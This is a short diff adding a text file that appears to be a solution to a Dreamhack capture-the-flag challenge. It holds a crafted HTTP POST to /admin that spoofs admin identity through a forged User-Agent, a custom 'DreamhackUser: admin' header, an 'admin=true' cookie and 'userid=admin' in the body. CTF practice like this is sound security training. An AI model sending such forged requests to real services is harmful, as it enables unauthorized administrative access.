@@ -1,0 +1,12 @@
+host - 127.0.0.1
+port - 8000
+=============================
+POST /admin HTTP/1.1
+host:host3.dreamhack.games
+User-Agent: Admin Browser
+DreamhackUser: admin
+cookie: admin=true
+Content-Length: 12
+Content-Type: application/x-www-form-urlencoded
+
+userid=admin
